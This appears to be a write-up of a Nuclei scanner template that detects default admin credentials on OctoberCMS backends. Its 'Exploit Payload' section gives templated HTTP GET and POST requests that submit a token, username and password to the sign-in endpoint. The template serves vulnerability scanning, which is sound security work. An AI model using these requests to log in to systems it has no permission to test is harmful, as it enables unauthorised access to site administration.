# Nuclei Template: OctoberCMS - Default Admin Discovery
**Template ID:** octobercms-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`octobercms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
OctoberCMS default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /backend/backend/auth/signin HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /backend/backend/auth/signin HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

_token={{token}}&postback=1&login={{username}}&password={{password}}
```

## References
- https://github.com/octobercms/october
- https://octobercms.com/
